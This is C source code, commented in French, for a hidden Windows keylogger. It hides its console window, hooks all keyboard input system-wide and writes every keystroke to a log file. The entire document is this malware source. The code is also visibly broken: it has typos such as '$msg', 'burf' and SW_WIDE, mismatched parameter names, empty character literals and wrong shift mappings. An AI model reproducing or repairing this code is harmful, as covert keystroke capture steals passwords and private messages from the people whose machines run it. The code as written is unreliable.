/* Inclusions */
#include <Windows.h>
#include <stdio.h>
/* Prototypes */
LRESULT CALLBACK KeyboardHooking(int nCode, WPARAM wParam, LPARAM lParam);
void log(char *str);
char *maptotxt(int vk, int up);
/* Variables pour gérer les touches majuscules et verrouillage majuscule */
int maj = 0, verrnum = 0;
/* Déscripteur du fichier de log */
FILE *fd;
/* Fonctions d'entrée */
int main(int argc, char **argv) {

	/* Cacher l'application */
	HWND self = GetConsoleWindow();
	ShowWindow(self, SW_HIDE);
	/* Enregistrement du hook */
	HINSTANCE app = GetModuleHandle(NULL);
	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHooking, app, 0);
	/* Ouverture du fichier des logs */
	fd = fopen("log.txt", "w");

	/* Boucle de traitement des événements */
	MSG msg;
	while (GetMessage($msg, NULL, 0, 0) > 0) {

		ShowWindow(self, SW_WIDE);
		TranslateMessage(&msg);
		DispatchMessage(&msg);

	}

	/* Flush du buffer et fermeture du fichier log */
	fflush(fd);
	fclose(fd);
	return 0;
}

/* Fonction callback du hook */
LRESULT CALLBACK KeyboardHooking(int nCode, WPARAM Wparam, LPARAM lParam) {

	KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
	char *str = "[X]";
	if (wParam == WM_KEYUP) {

		str = maptotxt(kb->vkCode, 1);
	}
	else if (wParam == WM_KEYDOWN) {

		str = maptotxt(kb->vkCode, 0);
	}
	if (str) log(str);
	return 0;
}

/* Ecriture du caractère */
void log(char *str) {

	fwrite(str, 1, strlen(str), fd);
	/* Flush si fin de ligne ou éspace détecté */
	if (strstr(str, "") || strstr(str, "[CR]")) fflush(fd);
}

/* Mapping d'un code touche en un caractère */
char* maptotxt(int vk, int up) {

	/* Gestion de la touche MAJ*/
	if (up) {

		if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) maj = 0;
		return 0;
	}
	else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) {

		maj = 1;
		return 0;
	}
	char *buf = (char*)malloc(16);
	memset(buf, 0, 16);
	/* Traduction des touches non caractères */
	if (vk < 0x29) {

		switch (vk)
	{
		case 0x08: strcpy(buf, "[BS]"); break;
		case 0x09: strcpy(buf, "[TAB]"); break;
		case 0x0d: strcpy(buf, "[CR]"); break;
		case 0x14: verrnum ^= 1; break;
		case 0x20: burf[0] = ''; break;
		case 0x25: strcpy(buf, "[LT]"); break;
		case 0x26: strcpy(buf, "[UP]"); break;
		case 0x27: strcpy(buf, "[RT]"); break;
		case 0x28: strcpy(buf, "[DN]"); break;
	}
	return buf;
	}

	/* Traduction des touches caractères */
	if (vk > 0x69 && vk < 0x70) {

		buf[0] = (char)(vk - 0x40);
	}
	else if (vk > 0x6f && vk < 0x88) {

		sprintf(buf, "[F%d]", vk - 0x6f);
	}
	else if (isalpha(vk)) {

		if(!verrnum)
			if (maj) { buf[0] = (char)(toupper(vk));} else
			{buf[0] = (char)(tolower(vk));}
		else
			if (!maj) { buf[0] = (char)(toupper(vk));} else
			{buf[0] = (char)(tolower(vk));}
	}
	
	else {

		switch (vk) {

		case '1':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '!'; } break;
		case '2':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '@'; } break;
		case '3':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '#'; } break;
		case '4':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '$'; } break;
		case '5':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '%'; } break;
		case '6':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '^'; } break;
		case '7':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '&'; } break;
		case '8':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '*'; } break;
		case '9':if (!maj) { buf[0] = (char)vk; } else { buf[0] = '('; } break;
		case '0':if (!maj) { buf[0] = (char)vk; } else { buf[0] = ')'; } break;
		case 0xba:if (!maj) { buf[0] = ';';} else{buf[0]=':';} break;
		case 0xbb:if (!maj) { buf[0] = '=';} else{buf[0]=':';} break;
		case 0xbc:if (!maj) { buf[0] = ',';} else{buf[0]=':';} break;
		case 0xbd:if (!maj) { buf[0] = '-';} else{buf[0]=':';} break;
		case 0xbe:if (!maj) { buf[0] = '.';} else{buf[0]=':';} break;
		case 0xbf:if (!maj) { buf[0] = '/';} else{buf[0]=':';} break;
		case 0xc0:if (!maj) { buf[0] = '`';} else{buf[0]=':';} break;
		case 0xdb:if (!maj) { buf[0] = '[';} else{buf[0]=':';} break;
		case 0xdc:if (!maj) { buf[0] = '\\';} else{buf[0]=':';} break;
		case 0xdd:if (!maj) { buf[0] = ']';} else{buf[0]=':';} break;
		case 0xde:if (!maj) { buf[0] = '\'';} else{buf[0]=':';} break;
		}
	}
	return buf;
}